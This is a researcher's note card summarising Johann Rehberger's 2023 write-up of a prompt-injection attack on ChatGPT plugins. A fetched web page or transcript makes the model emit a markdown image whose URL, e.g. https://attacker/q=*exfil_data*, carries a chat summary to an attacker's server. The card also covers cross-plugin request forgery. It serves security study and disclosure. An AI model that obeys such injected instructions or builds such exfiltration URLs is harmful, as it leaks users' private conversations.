---
id: rehberger-chatgpt-markdown-exfil
title: "ChatGPT Plugins: Data Exfiltration via Images & Cross Plugin Request Forgery"
author: Johann Rehberger (wunderwuzzi, Embrace The Red)
url: https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/
published: 2023-05-16
accessed: 2026-09-29
kind: blog
primary: true
---

## Summary

The researcher's write-up of the markdown image channel in ChatGPT. A web page or transcript fetched by a plugin carries instructions. The model then writes a markdown image whose URL holds a summary of the chat, and ChatGPT's interface loads the image, sending the data to the attacker's server. The same injection could call another plugin. OpenAI told him image markdown injection was a feature and wouldn't be changed. The page title has changed since `_candidates.md` listed it ("Data Exfiltration via Plugins and Markdown Injection").

## Key claims

- What it shows. "This post shows how a malicious website can take control of a ChatGPT chat session and exfiltrate the history of the conversation." (intro)
- The channel: "The individual controlling the data a plugin retrieves can exfiltrate chat history due to ChatGPT’s rendering of markdown images." (Untrusted Data and Markdown Injection)
- The mechanism: if the model returns `![data exfiltration in progress](https://attacker/q=*exfil_data*)`, "ChatGPT will render it automatically and retrieve the URL." (same)
- The injection "can ask to summarize the past history of the chat and append it to the URL to exfiltrate the data." (same)
- The model can build the URL itself: "summarize the past conversation, URL encode that summary and append that as query parameter. And off it goes to the attacker." (Proof of Concept Demonstration)
- Vectors: the WebPilot plugin and a YouTube transcript plugin. (same)
- The leaked text, "TooManySecrets123", "is something that was written earlier in the chat conversation." (same)
- One plugin's injection can call another (Expedia): "Cross Plugin Request Forgery". (But wait, there is more)
- Suggested fix: "Scenarios like rendering images could be implemented as a dedicated feature, rather than depending on the convenience of markdown." (Mitigations and Suggestions)
- Disclosed to OpenAI on 2023-04-09; "I was informed that image markdown injection is a feature and that no changes are planned to mitigate this vulnerability." (Responsible Disclosure)
- Found independently by Roman Samoilenko at the end of March 2023. (Untrusted Data and Markdown Injection)

## Visuals worth redrawing

- The loop: web page → plugin → model writes image markdown → browser fetches attacker URL.

## My notes

- ChatGPT plugins no longer exist; the mechanism still shows up in later cases (EchoLeak).
